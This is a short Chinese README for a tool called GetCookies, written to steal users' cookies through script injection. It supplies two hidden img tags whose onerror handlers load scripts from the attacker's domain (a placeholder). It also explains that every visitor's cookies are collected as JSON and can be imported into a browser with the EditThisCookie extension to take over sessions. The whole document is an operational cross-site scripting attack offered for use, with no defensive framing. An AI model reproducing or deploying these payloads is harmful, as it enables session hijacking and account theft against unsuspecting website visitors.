# GetCookies
要通过脚本注入，获取用户的Cookie

首先在可以注入的页面加上两个img标签：
<img src="a" style="display:none;" onerror="s=createElement('script');body.appendChild(s);s.src='http://你的域名/Scripts/jquery-1.11.3.min.js';">
<img src="b" style="display:none;" onerror="s=createElement('script');body.appendChild(s);s.src='http://你的域名/Scripts/JavaScript1.js';">
然后只要用户进入这个页面，就会把Cookie信息发送到该网站里，并且程序会将收集到的Cookie写到文件里，以JSON格式。
可以使用Chrome的EditThisCookie插件直接导入。
